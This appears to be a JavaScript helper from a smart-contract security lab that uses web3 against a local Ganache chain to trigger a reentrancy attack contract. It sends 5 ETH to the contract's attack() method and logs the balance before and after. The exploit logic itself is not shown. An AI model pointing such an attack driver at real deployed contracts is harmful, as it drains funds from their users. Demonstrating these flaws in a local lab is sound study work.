import Web3 from 'web3';
import fs from 'fs';

const launchReentrancyAttack = async (_, options) => {
    const web3 = new Web3('http://ganache:8545');
    const accounts = await web3.eth.getAccounts();

    const atkAbi = JSON.parse(fs.readFileSync('./artifacts/ReentrancyAttackABI.json'));
    let atkAddress = options.attack;

    if (!atkAddress) {
        const contractMap = JSON.parse(fs.readFileSync('./config/contracts-map.json'));
        atkAddress = contractMap['1337']['ReentrancyAttack'];
    }

    const attacker = new web3.eth.Contract(atkAbi, atkAddress);

    const before = await web3.eth.getBalance(atkAddress);
    console.log("💰 Attack contract balance before:", Web3.utils.fromWei(before, 'ether'), "ETH");

    await attacker.methods.attack().send({
        from: accounts[1],
        value: web3.utils.toWei('5', 'ether'),
        gas: 300000
    });

    const after = await web3.eth.getBalance(atkAddress);
    console.log("🔥 Attack launched!");
    console.log("💰 Attack contract balance after:", Web3.utils.fromWei(after, 'ether'), "ETH");
};

export default launchReentrancyAttack;
